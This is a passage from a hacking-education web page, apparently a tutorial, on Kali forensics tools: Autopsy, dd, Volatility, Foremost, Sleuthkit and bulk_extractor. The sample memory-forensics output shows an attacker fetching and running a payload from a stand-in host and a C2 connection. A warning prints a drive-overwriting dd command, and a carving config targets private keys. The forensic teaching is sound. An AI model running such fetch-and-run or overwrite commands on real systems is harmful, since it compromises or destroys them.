<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bonus B2: Kali Linux - Part II - NullSector</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #000; --bg2: #0a0a0a; --bg3: #111;
            --text: #fff; --text2: #888; --text3: #555;
            --border: rgba(255,255,255,0.1);
        }
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0a0a0a 0%, #1a0f00 100%); color: var(--text); line-height: 1.7; overflow-x: hidden; }
        .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; }
        .header-content { width: 100%; max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
        .brand { display: flex; align-items: center; gap: 0.75rem; text-decoration: none; color: var(--text); font-weight: 700; font-size: 1.25rem; }
        .nav { display: flex; gap: 2rem; align-items: center; }
        .nav a { color: var(--text2); text-decoration: none; font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
        .nav a:hover { color: var(--text); }
        .dropdown { position: relative; display: inline-block; }
        .dropdown-toggle { cursor: pointer; display: flex; align-items: center; gap: 0.5rem; color: var(--text2); font-size: 0.95rem; font-weight: 500; transition: color 0.3s; }
        .dropdown-toggle:hover { color: var(--text); }
        .dropdown-menu { position: absolute; top: 100%; left: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 8px; margin-top: 0.5rem; min-width: 200px; opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.3s cubic-bezier(0.16,1,0.3,1); z-index: 1001; }
        .dropdown:hover .dropdown-menu { opacity: 1; visibility: visible; transform: translateY(0); }
        .dropdown-menu a { display: block; padding: 1rem 1.5rem; color: var(--text2); text-decoration: none; transition: all 0.2s; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .dropdown-menu a:last-child { border-bottom: none; }
        .dropdown-menu a:hover { background: rgba(255,255,255,0.05); color: var(--text); padding-left: 2rem; }
        .dropdown-arrow { font-size: 0.7rem; transition: transform 0.3s; }
        .dropdown:hover .dropdown-arrow { transform: rotate(180deg); }
        .sidebar { position: fixed; left: 0; top: 70px; width: 280px; height: calc(100vh - 70px); background: rgba(10,10,10,0.95); backdrop-filter: blur(10px); border-right: 1px solid var(--border); overflow-y: auto; padding: 2rem 0; z-index: 100; }
        .sidebar::-webkit-scrollbar { width: 6px; }
        .sidebar::-webkit-scrollbar-thumb { background: rgba(249,115,22,0.3); border-radius: 3px; }
        .sidebar-section { padding: 0 1.5rem; margin-bottom: 2rem; }
        .sidebar-title { font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text3); margin-bottom: 1rem; }
        .sidebar-link { display: block; color: var(--text2); text-decoration: none; padding: 0.6rem 1rem; margin: 0.25rem 0; border-radius: 6px; font-size: 0.9rem; transition: all 0.3s; }
        .sidebar-link:hover { background: rgba(249,115,22,0.1); color: #FB923C; transform: translateX(4px); }
        .sidebar-link.active { background: rgba(249,115,22,0.2); color: #FB923C; font-weight: 600; }
        .main { margin-left: 280px; margin-top: 70px; padding: 4rem 3rem; max-width: 1100px; }
        .page-header { margin-bottom: 4rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); position: relative; }
        .bonus-badge { position: absolute; top: -10px; right: 0; background: linear-gradient(135deg, #FB923C 0%, #F97316 100%); color: #000; padding: 0.5rem 1.5rem; border-radius: 50px; font-weight: 800; font-size: 0.875rem; letter-spacing: 1px; display: flex; align-items: center; gap: 0.5rem; }
        .chapter-label { font-size: 0.875rem; font-weight: 600; text-transform: uppercase; letter-spacing: 2px; color: #FB923C; margin-bottom: 1rem; }
        .page-title { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1rem; letter-spacing: -1px; background: linear-gradient(135deg, #FB923C 0%, #F97316 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
        .page-subtitle { font-size: 1.25rem; color: var(--text2); font-weight: 400; line-height: 1.6; }
        .section { margin-bottom: 6rem; scroll-margin-top: 100px; }
        .section-title { font-size: 2.25rem; font-weight: 700; margin-bottom: 1.5rem; color: #FB923C; }
        .section-intro { font-size: 1.125rem; color: var(--text2); margin-bottom: 2rem; line-height: 1.8; }
        h3 { font-size: 1.75rem; font-weight: 600; margin: 3rem 0 1.5rem; }
        h4 { font-size: 1.375rem; font-weight: 600; margin: 2.5rem 0 1.25rem; }
        p { font-size: 1.0625rem; line-height: 1.8; margin-bottom: 1.5rem; }
        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 2rem 0; }
        .card { background: var(--bg3); border: 1px solid var(--border); border-radius: 12px; padding: 2rem; transition: all 0.3s; }
        .card:hover { transform: translateY(-4px); border-color: rgba(249,115,22,0.5); }
        .card h4 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; margin-top: 0; }
        .card p { color: var(--text2); font-size: 0.9375rem; margin-bottom: 0; }
        .info-box { background: rgba(249,115,22,0.1); border-left: 3px solid #FB923C; padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; word-wrap: break-word; overflow-wrap: break-word; }
        .info-box h4 { font-weight: 600; margin-bottom: 0.75rem; margin-top: 0; color: #FB923C; }
        .info-box p { color: var(--text2); margin-bottom: 0; }
        .warning-box { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-left: 3px solid #EF4444; padding: 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; word-wrap: break-word; overflow-wrap: break-word; }
        .warning-box h4 { font-weight: 600; margin-bottom: 0.75rem; color: #EF4444; margin-top: 0; }
        .code { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.7; white-space: pre-wrap; word-wrap: break-word; max-width: 100%; }
        .inline-code { background: rgba(249,115,22,0.2); padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.875em; color: #FB923C; }
        .metaphor-box { background: rgba(249,115,22,0.05); border-left: 4px solid #FB923C; padding: 1.5rem 2.5rem 1.5rem 1.5rem; margin: 2rem 0; border-radius: 0 8px 8px 0; position: relative; word-wrap: break-word; overflow-wrap: break-word; }
        .metaphor-box::before { content: "üí°"; position: absolute; top: 1rem; right: 1rem; font-size: 1.5rem; }
        .metaphor-box h4 { margin-bottom: 0.75rem; font-weight: 600; margin-top: 0; }
        ul, ol { margin: 1.5rem 0; padding-left: 2rem; }
        li { margin: 0.75rem 0; color: var(--text2); }
        table { width: 100%; border-collapse: collapse; margin: 2rem 0; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
        th, td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--border); }
        th { background: rgba(249,115,22,0.1); font-weight: 600; font-size: 0.875rem; text-transform: uppercase; color: #FB923C; }
        td { color: var(--text2); font-size: 0.9375rem; }
        .progress { position: fixed; top: 70px; left: 0; height: 3px; background: linear-gradient(90deg, #FB923C 0%, #F97316 100%); transition: width 0.1s; z-index: 1001; }
        @media (max-width: 1024px) { .sidebar { transform: translateX(-100%); } .main { margin-left: 0; padding: 3rem 2rem; } .page-title { font-size: 2.5rem; } }
    </style>
</head>
<body>
    <div class="progress" id="progress"></div>
    <header class="header">
        <div class="header-content">
            <a href="index.html" class="brand">
                <img src="logo.svg" alt="NullSector" width="36" height="36">
                <span>NullSector</span>
            </a>
            <nav class="nav">
                <a href="roadmap-hacking.html">Hacking</a>
                <a href="roadmap-programming.html">Programming</a>
                <a href="resources.html">Resources</a>
                <div class="dropdown">
                    <span class="dropdown-toggle">
                        Null Tools
                        <span class="dropdown-arrow">‚ñº</span>
                    </span>
                    <div class="dropdown-menu">
                        <a href="https://github.com/4fqr/null-cli" target="_blank">Null CLI</a>
                        <a href="https://nullheadline.vercel.app/" target="_blank">Null Hacker's Headlines</a>
                        <a href="https://github.com/4fqr/nullmysteryorg" target="_blank">Null: Mystery Organisation</a>
                        <a href="https://github.com/4fqr/null-ide/" target="_blank">Null IDE</a>
                    </div>
                </div>
                <a href="null-terminal.html">Null Terminal</a>
                <a href="faq.html">FAQs</a>
                <a href="https://discord.gg/cMvWkxFbbX" target="_blank">Discord</a>
            </nav>
        </div>
    </header>

    <aside class="sidebar">
        <div class="sidebar-section">
            <div class="sidebar-title">On This Page</div>
            <a href="#digital-forensics" class="sidebar-link">Digital Forensics</a>
            <a href="#mobile-security" class="sidebar-link">Mobile Security</a>
            <a href="#iot-hardware" class="sidebar-link">IoT & Hardware Hacking</a>
            <a href="#cloud-pentesting" class="sidebar-link">Cloud Pentesting</a>
            <a href="#advanced-wireless" class="sidebar-link">Advanced Wireless</a>
            <a href="#reverse-engineering" class="sidebar-link">Reverse Engineering</a>
            <a href="#advanced-exploitation" class="sidebar-link">Advanced Exploitation</a>
            <a href="#red-team" class="sidebar-link">Red Team Operations</a>
            <a href="#custom-tools" class="sidebar-link">Custom Tool Development</a>
            <a href="#physical-security" class="sidebar-link">Physical Security</a>
            <a href="#advanced-osint" class="sidebar-link">Advanced OSINT</a>
            <a href="#remaining-tools" class="sidebar-link">Remaining Kali Tools</a>
        </div>
        <div class="sidebar-section">
            <div class="sidebar-title">Navigation</div>
            <a href="hacking-bonus-kali-part1.html" class="sidebar-link">‚Üê Previous: Kali Part I</a>
            <a href="hacking-ch07.html" class="sidebar-link">Chapter 07: Web Security</a>
            <a href="programming-ch08.html" class="sidebar-link">Next: Full-Stack Integration ‚Üí</a>
        </div>
    </aside>

    <main class="main">
        <div class="page-header">
            <div class="bonus-badge">üöÄ BONUS B2</div>
            <div class="chapter-label">Bonus Chapter B2</div>
            <h1 class="page-title">Kali Linux - Part II</h1>
            <p class="page-subtitle">Complete the Kali dictionary with the remaining 50% of tools, advanced exploitation techniques, digital forensics, mobile security, IoT hacking, cloud pentesting, reverse engineering mastery, red team operations, and custom tool development. This is the ultimate comprehensive guide to every aspect of Kali Linux.</p>
        </div>

        <!-- SECTION 1: Digital Forensics & Memory Analysis -->
        <section id="digital-forensics" class="section">
            <h2 class="section-title">Digital Forensics & Memory Analysis</h2>
            <p class="section-intro">Digital forensics is like being a detective for computers. When a computer gets hacked or a crime happens, forensic investigators examine the digital evidence left behind‚Äîdeleted files, memory dumps, logs, hidden data. In this section, you'll learn how to analyze disk images, recover deleted files, examine memory for malware, and uncover evidence that attackers tried to hide. Think CSI, but for cybersecurity!</p>

            <h3>What Even IS Digital Forensics?</h3>
            
            <div class="metaphor-box">
                <h4>Digital Forensics = Crime Scene Investigation for Computers</h4>
                <p><strong>Crime scene:</strong> A hacker broke into a company server<br>
                <strong>Evidence:</strong> Hard drive image, RAM dump, network logs<br>
                <strong>Your job:</strong> Find out WHO did it, WHAT they did, WHEN it happened, and HOW they got in<br><br>
                Just like a real detective:<br>
                ‚Ä¢ Preserve the evidence (don't modify original data!)<br>
                ‚Ä¢ Analyze artifacts (files, logs, memory)<br>
                ‚Ä¢ Timeline reconstruction (what happened when?)<br>
                ‚Ä¢ Report findings (document everything)<br><br>
                Digital forensics tools help you examine data without changing it, recover deleted files, and find hidden clues!</p>
            </div>

            <h3>Part 1: Autopsy - The Ultimate Disk Forensics Tool</h3>
            
            <p><strong>Autopsy</strong> is a GUI-based forensic tool that makes analyzing disk images EASY. It's like having a magnifying glass for hard drives!</p>

            <h4>What Can Autopsy Do?</h4>
            
            <div class="code">‚úÖ Analyze disk images (entire hard drive copies)
‚úÖ Recover deleted files (from recycle bin or permanently deleted)
‚úÖ Extract metadata (when files were created, modified, accessed)
‚úÖ Search for keywords across entire disk
‚úÖ Timeline analysis (what happened at what time)
‚úÖ Hash analysis (verify file integrity, detect known bad files)
‚úÖ Web history (browser history, cookies, downloads)
‚úÖ Email analysis (extract emails from mail clients)</div>

            <h4>Starting Autopsy</h4>
            
            <div class="code"># Launch Autopsy (GUI opens in browser)
autopsy

# Output:
# Open Web Browser on http://localhost:9999/autopsy
# 
# Now open your browser and go to that URL!</div>

            <div class="info-box">
                <h4>What's a Disk Image?</h4>
                <p>A disk image is a PERFECT copy of an entire hard drive, USB stick, or SD card. It's like taking a photograph of the drive‚Äîevery file, every deleted file, every bit of data is captured EXACTLY as it was.<br><br>
                <strong>Why use images instead of the original drive?</strong><br>
                ‚Ä¢ Preserve evidence (don't risk modifying the original)<br>
                ‚Ä¢ Work on a copy (safe to experiment)<br>
                ‚Ä¢ Repeatability (other investigators can analyze the same data)<br><br>
                Common formats: <span class="inline-code">.dd</span> (raw image), <span class="inline-code">.E01</span> (EnCase format), <span class="inline-code">.AFF</span> (Advanced Forensic Format)</p>
            </div>

            <h4>Creating a Disk Image with dd</h4>
            
            <div class="code"># dd = "disk dump" - creates byte-for-byte copy of a drive
# 
# Basic syntax:
# dd if=INPUT of=OUTPUT bs=BLOCK_SIZE
#
# if = input file (source drive)
# of = output file (destination image)
# bs = block size (how much data to copy at once)

# Example: Image a USB drive
sudo dd if=/dev/sdb of=/root/evidence/usb_image.dd bs=4M status=progress

# Let's break this down:
# if=/dev/sdb         ‚Üí Source: USB drive (sdb is the device name)
# of=usb_image.dd     ‚Üí Destination: File where image will be saved
# bs=4M               ‚Üí Block size: Copy 4 megabytes at a time (faster!)
# status=progress     ‚Üí Show progress bar while copying

# Output while running:
# 1073741824 bytes (1.1 GB) copied, 45 s, 23.9 MB/s
# [Shows how much data copied and speed]

# When done:
# 2048+0 records in
# 2048+0 records out
# 2147483648 bytes (2.1 GB) copied, 89.5 s, 24.0 MB/s</div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è BE EXTREMELY CAREFUL WITH dd!</h4>
                <p>If you mix up <span class="inline-code">if</span> and <span class="inline-code">of</span>, you'll OVERWRITE your source drive and DESTROY THE EVIDENCE!<br><br>
                <strong>WRONG (DISASTER):</strong><br>
                <span class="inline-code">sudo dd if=/root/evidence/usb_image.dd of=/dev/sdb</span><br>
                ‚Üë This OVERWRITES the USB drive with the image file!<br><br>
                <strong>Always double-check:</strong><br>
                ‚Ä¢ if = where you're copying FROM (source)<br>
                ‚Ä¢ of = where you're copying TO (destination)<br><br>
                <strong>Pro tip:</strong> Use <span class="inline-code">lsblk</span> to verify device names before running dd!</p>
            </div>

            <h4>Using Autopsy to Analyze a Disk Image</h4>
            
            <div class="code"># Step 1: Launch Autopsy
autopsy

# Step 2: Open http://localhost:9999/autopsy in browser

# Step 3: Create New Case
# - Case Name: "USB_Investigation_2026"
# - Description: "Analyzing suspicious USB drive"
# - Investigator: "Your Name"
# Click "New Case"

# Step 4: Add Host
# - Host Name: "Suspect_USB"
# - Description: "USB drive from suspect's desk"
# Click "Add Host"

# Step 5: Add Image
# - Click "Add Image"
# - Image Type: "Partition"
# - Image File: Browse to /root/evidence/usb_image.dd
# - Import Method: "Symlink" (faster) or "Copy" (safer)
# Click "Next" ‚Üí "Add"

# Step 6: File Analysis
# Now you can:
# - Browse all files (even deleted ones!)
# - Search for keywords
# - View file metadata
# - Extract files
# - Generate timeline</div>

            <h4>Autopsy's Key Features</h4>
            
            <div class="card-grid">
                <div class="card">
                    <h4>File Browser</h4>
                    <p>Navigate the entire file system. See EVERYTHING‚Äîincluding deleted files marked with an X. Click any file to view its contents, metadata, and hex dump.</p>
                </div>
                <div class="card">
                    <h4>Keyword Search</h4>
                    <p>Search entire disk for words like "password", "secret", email addresses, credit card numbers. Finds hidden data in files, slack space, unallocated clusters.</p>
                </div>
                <div class="card">
                    <h4>Timeline</h4>
                    <p>See WHEN every file was created, modified, accessed, deleted. Reconstruct exactly what the user did hour by hour!</p>
                </div>
                <div class="card">
                    <h4>Hash Database</h4>
                    <p>Compare file hashes against known databases. Identify malware, illegal files, or verify legitimate system files haven't been tampered with.</p>
                </div>
            </div>

            <h3>Part 2: Volatility - Memory Forensics Master</h3>
            
            <p><strong>Volatility</strong> analyzes RAM dumps to find evidence of malware, hidden processes, network connections, and malicious activity that only exists in memory!</p>

            <div class="metaphor-box">
                <h4>Why Analyze Memory?</h4>
                <p>Think of RAM as short-term memory for a computer:<br><br>
                <strong>Hard Drive:</strong> Long-term storage (files saved forever)<br>
                <strong>RAM:</strong> Active memory (what's running RIGHT NOW)<br><br>
                Sophisticated malware runs ONLY in memory‚Äîno files on disk! It injects itself into processes, hides from antivirus, and disappears when the computer reboots. But if you capture RAM before it reboots, Volatility can find it!<br><br>
                Memory dumps contain:<br>
                ‚Ä¢ Running processes (including hidden malware)<br>
                ‚Ä¢ Network connections (where malware is connecting)<br>
                ‚Ä¢ Open files (what programs are accessing)<br>
                ‚Ä¢ Encryption keys (sometimes recoverable!)<br>
                ‚Ä¢ Command history (what commands were run)<br>
                ‚Ä¢ Passwords in memory (cleartext!)</p>
            </div>

            <h4>Capturing Memory with LiME (Linux) or DumpIt (Windows)</h4>
            
            <div class="code"># On Linux: Use LiME (Linux Memory Extractor)
# First, install LiME (comes with Kali)
cd /usr/src/lime
make

# Capture memory
sudo insmod lime.ko "path=/root/evidence/memory.lime format=lime"

# Output:
# [LiME] Allocated memory range: 0x0000000000000000 - 0x000000007fffffff
# [LiME] Writing 8GB to /root/evidence/memory.lime
# [This takes a few minutes depending on RAM size]

# On Windows: Use DumpIt or FTK Imager
# DumpIt.exe ‚Üí Click "Start" ‚Üí Saves memory.dmp</div>

            <h4>Volatility Basics - Finding the Memory Profile</h4>
            
            <div class="code"># Volatility needs to know what OS version the memory dump is from
# First, identify the profile:

volatility -f memory.lime imageinfo

# Output:
# Suggested Profile(s) : LinuxUbuntu2004x64, LinuxDebian10x64
# AS Layer1 : LinuxAMD64PagedMemory (Kernel AS)
# DTB : 0x1aa000L
# 
# The "Suggested Profile" tells you what OS this dump is from!
# Now use that profile for all subsequent commands</div>

            <div class="info-box">
                <h4>What's a Profile?</h4>
                <p>Different operating systems store data differently in memory. Volatility needs to know the exact OS version to correctly parse the memory structures.<br><br>
                <strong>Think of it like languages:</strong><br>
                If you're reading a book, you need to know if it's in English, Spanish, or Chinese to understand it. Similarly, Volatility needs to know if the memory is from Windows 10, Ubuntu 20.04, or macOS to parse it correctly!<br><br>
                Always run <span class="inline-code">imageinfo</span> first to find the right profile!</p>
            </div>

            <h4>Volatility Commands - The Essential Plugins</h4>
            
            <div class="code"># 1. List running processes
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_pslist

# Output:
# Offset      Name      Pid    PPid   Uid    Start Time
# 0x88007c00  init      1      0      0      2026-01-07 10:23:45
# 0x88007e00  systemd   1234   1      0      2026-01-07 10:24:12
# 0x88008000  bash      2345   1234   1000   2026-01-07 11:15:33
# 0x88008200  malware   3456   1      0      2026-01-07 14:22:19  ‚Üê Suspicious!
# 
# Shows every process that was running, including:
# - PID (process ID)
# - PPID (parent process ID - who started this process)
# - User who ran it (Uid 0 = root)
# - When it started

# 2. Find hidden/injected processes
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_psxview

# This compares multiple process-listing methods
# If a process appears in one method but not another, it's HIDDEN!
# Common malware technique: remove process from task list but keep running

# 3. List network connections
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_netstat

# Output:
# Protocol  Local Address        Foreign Address      State      PID
# TCP       192.168.1.10:443     8.8.8.8:443          ESTABLISHED 2345
# TCP       192.168.1.10:4444    evil-c2.com:4444     ESTABLISHED 3456  ‚Üê C2!
# 
# Shows what connections were active
# Look for suspicious IPs, known C2 servers, unusual ports

# 4. Dump process memory
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_procdump -p 3456 -D /root/evidence/

# Extracts the entire memory of process 3456 (the suspicious one)
# Creates file: 3456.dmp
# Now you can analyze the malware's code directly!

# 5. Extract command history
volatility -f memory.lime --profile=LinuxUbuntu2004x64 linux_bash

# Output:
# Pid    Command Time                 Command
# 2345   2026-01-07 11:15:33          cd /tmp
# 2345   2026-01-07 11:16:12          wget http://malicious.com/payload
# 2345   2026-01-07 11:16:45          chmod +x payload
# 2345   2026-01-07 11:17:02          ./payload
# 
# Shows EXACTLY what commands the attacker ran!</div>

            <h4>Volatility for Windows Memory</h4>
            
            <div class="code"># Windows has different plugins but same workflow:

# 1. Identify profile
volatility -f memory.dmp imageinfo

# Output:
# Suggested Profile(s): Win10x64_19041

# 2. List processes
volatility -f memory.dmp --profile=Win10x64_19041 pslist

# 3. Find DLLs loaded by a process
volatility -f memory.dmp --profile=Win10x64_19041 dlllist -p 1234

# Shows all libraries a process loaded
# Malware often injects malicious DLLs into legitimate processes!

# 4. Scan for malware indicators
volatility -f memory.dmp --profile=Win10x64_19041 malfind

# Automatically detects suspicious memory regions:
# - Executable code in unusual places
# - Hidden/injected code
# - Packed/encrypted sections

# Output:
# Process: explorer.exe Pid: 2468
# Address: 0x7fef0000
# Protection: PAGE_EXECUTE_READWRITE (suspicious!)
# 
# Hexdump:
# 4d 5a 90 00 03 00 00 00  MZ......  ‚Üê PE header (executable!)
# [This is injected malware!]

# 5. Extract registry hives
volatility -f memory.dmp --profile=Win10x64_19041 hivelist

# Shows all registry hives in memory
# You can then dump them and analyze:
volatility -f memory.dmp --profile=Win10x64_19041 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# Shows programs set to run at startup (persistence mechanism!)</div>

            <div class="warning-box">
                <h4>Memory Analysis Takes TIME!</h4>
                <p>Analyzing an 8GB memory dump can take hours. Volatility scans the entire dump for each command. Be patient!<br><br>
                <strong>Tips for faster analysis:</strong><br>
                ‚Ä¢ Use <span class="inline-code">--output=json</span> to save results for later review<br>
                ‚Ä¢ Run multiple plugins at once in separate terminals<br>
                ‚Ä¢ Focus on specific processes if you have leads<br>
                ‚Ä¢ Consider using <span class="inline-code">bulk_extractor</span> first for quick wins</p>
            </div>

            <h3>Part 3: Foremost - File Carving Master</h3>
            
            <p><strong>Foremost</strong> recovers deleted files from disk images by looking for file signatures (magic bytes) without needing the file system!</p>

            <div class="metaphor-box">
                <h4>File Carving = Finding Puzzle Pieces in a Junkyard</h4>
                <p>Imagine a shredded document. The pieces are scattered, but each piece has clues (edges, colors, text). File carving is similar:<br><br>
                Every file type has a unique "signature" (magic bytes) at the start:<br>
                ‚Ä¢ JPEG: <span class="inline-code">FF D8 FF</span><br>
                ‚Ä¢ PDF: <span class="inline-code">25 50 44 46</span> (literally "%PDF")<br>
                ‚Ä¢ ZIP: <span class="inline-code">50 4B 03 04</span><br><br>
                Foremost scans the ENTIRE disk looking for these signatures, then extracts the complete file‚Äîeven if it's deleted, the file system is damaged, or it's in unallocated space!<br><br>
                It's like having X-ray vision for hard drives!</p>
            </div>

            <h4>Using Foremost</h4>
            
            <div class="code"># Basic usage:
foremost -i INPUT_IMAGE -o OUTPUT_DIR

# Example: Carve files from USB image
foremost -i /root/evidence/usb_image.dd -o /root/evidence/carved_files/

# Foremost scans the image and extracts:
# - All JPEGs
# - All PDFs
# - All DOC/DOCX files
# - All ZIP files
# - PNG, GIF, AVI, MPG, WAV, etc.

# Output while running:
# Processing: /root/evidence/usb_image.dd
# [Shows progress bar]

# When done, check the output directory:
ls /root/evidence/carved_files/

# Output:
# jpg/     ‚Üê All recovered JPEG files
# pdf/     ‚Üê All recovered PDFs
# zip/     ‚Üê All recovered ZIPs
# audit.txt ‚Üê Summary of what was found</div>

            <h4>Foremost Flags</h4>
            
            <div class="code"># -t : Specify file types to carve (faster than carving everything)
foremost -t jpg,pdf,doc -i image.dd -o output/

# Only carves JPEGs, PDFs, and DOC files

# -v : Verbose mode (show more details)
foremost -v -i image.dd -o output/

# -q : Quiet mode (no output, just run)
foremost -q -i image.dd -o output/

# -c : Use custom configuration file
foremost -c /path/to/custom.conf -i image.dd -o output/

# Custom config lets you define your own file signatures!

# -d : Enable indirect block detection (for fragmented files)
foremost -d -i image.dd -o output/

# Tries harder to recover fragmented files (slower but more thorough)</div>

            <h4>Custom Configuration for Foremost</h4>
            
            <div class="code"># Create custom foremost config to carve unusual file types
# Config file format: filetype case header footer maxsize
# 
# Example config (/root/custom_foremost.conf):

# Carve Bitcoin wallet files
dat y \x35\x05\x00\x00\x00\x00\x00\x00 \xff\xff\xff\xff 5000000

# Carve PGP private keys
asc y -----BEGIN\sPGP -----END\sPGP 10000

# Carve SSH private keys  
pem y -----BEGIN\sRSA -----END\sRSA 10000

# Use custom config:
foremost -c /root/custom_foremost.conf -i image.dd -o output/</div>

            <div class="info-box">
                <h4>When to Use File Carving</h4>
                <p><strong>Use Foremost when:</strong><br>
                ‚Ä¢ Files have been permanently deleted (not in recycle bin)<br>
                ‚Ä¢ File system is corrupted/damaged<br>
                ‚Ä¢ Suspect reformatted the drive<br>
                ‚Ä¢ You need to recover specific file types quickly<br><br>
                <strong>Limitations:</strong><br>
                ‚Ä¢ Can't recover filenames (files are named sequentially like 00000001.jpg)<br>
                ‚Ä¢ Can't recover directory structure<br>
                ‚Ä¢ Fragmented files might not carve correctly<br>
                ‚Ä¢ Overwrites make recovery impossible<br><br>
                For better results, use Foremost + Autopsy together!</p>
            </div>

            <h3>Part 4: Sleuthkit - Command-Line Forensics Powerhouse</h3>
            
            <p><strong>Sleuthkit</strong> is a collection of command-line tools for forensic analysis. Autopsy uses Sleuthkit under the hood!</p>

            <h4>Key Sleuthkit Tools</h4>
            
            <div class="code"># mmls - Display partition layout
mmls image.dd

# Output:
# DOS Partition Table
# Offset    Sector  Start    End      Length   Description
# 0000000000 0000   0000000  0000000  0000001  Primary Table (#0)
# 0000000001 0001   0000001  0002047  0002047  Unallocated
# 0000001048576 2048  0002048  0502399  0500352  Linux (0x83)
# 
# Shows you where each partition starts/ends
# Useful for finding hidden partitions!

# fsstat - Show file system info
fsstat image.dd

# Output:
# FILE SYSTEM INFORMATION
# File System Type: Ext4
# Volume Name: USB_DRIVE
# Volume ID: a1b2c3d4
# Last Written: 2026-01-07 14:22:19 PST
# Last Checked: 2026-01-01 09:00:00 PST
# Block Size: 4096
# Total Blocks: 512000
# Free Blocks: 123456

# fls - List files (including deleted!)
fls -r image.dd

# Output:
# r/r 12: secret.txt
# r/r * 24: deleted_file.pdf  ‚Üê Asterisk means DELETED!
# d/d 36: Documents
# r/r 48: photo.jpg
# 
# -r flag makes it recursive (shows files in subdirectories)

# icat - Extract file by inode number
icat image.dd 24 > recovered_file.pdf

# Extracts the deleted file with inode 24!
# Inode = unique file identifier (like a social security number for files)

# ils - List deleted inodes
ils image.dd

# Shows all deleted files that can potentially be recovered

# istat - Show detailed inode info
istat image.dd 24

# Output:
# inode: 24
# Allocated: No (DELETED!)
# File Type: Regular File
# Size: 524288 bytes
# Created: 2026-01-05 10:15:30 PST
# Modified: 2026-01-05 10:20:45 PST
# Accessed: 2026-01-07 14:10:22 PST
# Deleted: 2026-01-07 14:22:19 PST</div>

            <h4>Timeline Analysis with Sleuthkit</h4>
            
            <div class="code"># Create a timeline of ALL file activity
# Step 1: Extract timeline data
fls -r -m / image.dd > timeline.body

# Step 2: Convert to human-readable format
mactime -b timeline.body -d > timeline.txt

# Step 3: View timeline
cat timeline.txt

# Output:
# Date,Size,Type,Mode,UID,GID,Meta,File Name
# 2026-01-07 10:15:30, 1024, .a.., -rw-r--r--, 1000, 1000, 12, /home/user/secret.txt
# 2026-01-07 14:22:19, 524288, .a.., -rw-r--r--, 1000, 1000, 24, /home/user/deleted.pdf (deleted)
# 
# Shows EXACTLY when every file was created, modified, accessed, deleted!
# Perfect for reconstructing attacker's actions</div>

            <h3>Part 5: bulk_extractor - Fast Evidence Scanner</h3>
            
            <p><strong>bulk_extractor</strong> scans disk images for useful information WITHOUT parsing the file system. It's FAST and finds things other tools miss!</p>

            <div class="code"># Basic usage:
bulk_extractor -o OUTPUT_DIR INPUT_IMAGE

# Example:
bulk_extractor -o /root/evidence/bulk_results/ /root/evidence/usb_image.dd

# bulk_extractor automatically extracts:
# ‚úÖ Email addresses
# ‚úÖ URLs
# ‚úÖ Credit card numbers
# ‚úÖ Phone numbers  
# ‚úÖ Social security numbers
# ‚úÖ Bitcoin addresses
# ‚úÖ GPS coordinates (EXIF data)
# ‚úÖ Encryption keys
# ‚úÖ Domain names
# ‚úÖ Search terms

# Output files created:
ls /root/evidence/bulk_results/

# Output:
# email.txt            ‚Üê All email addresses found
# url.txt              ‚Üê All URLs found
# ccn.txt              ‚Üê Credit card numbers (!!!)
# telephone.txt        ‚Üê Phone numbers
# domain.txt           ‚Üê Domain names
# gps.txt              ‚Üê GPS coordinates from photos
# rfc822.txt           ‚Üê Email messages
# wordlist.txt         ‚Üê Unique words (useful for password cracking!)</div>

            <div class="info-box">
                <h4>Why bulk_extractor is AMAZING</h4>
                <p><strong>Speed:</strong> Scans gigabytes in minutes (doesn't care about file system)<br>
                <strong>Thoroughness:</strong> Finds data in unallocated space, compressed files, memory dumps<br>
                <strong>Automation:</strong> No configuration needed‚Äîjust point and shoot!<br><br>
                <strong>Real-world use case:</strong><br>
                Investigator has 100GB disk image. Instead of manually searching, run bulk_extractor overnight. Wake up to nicely organized lists of emails, URLs, and sensitive data. Follow the leads from there!<br><br>
                It's like having a robot assistant that reads EVERYTHING and highlights the important stuff!</p>
            </div>

            <h4>bulk_extractor Advanced Options</h4>
            
            <div class="code"># -j : Number of threads (faster on multi-core systems)
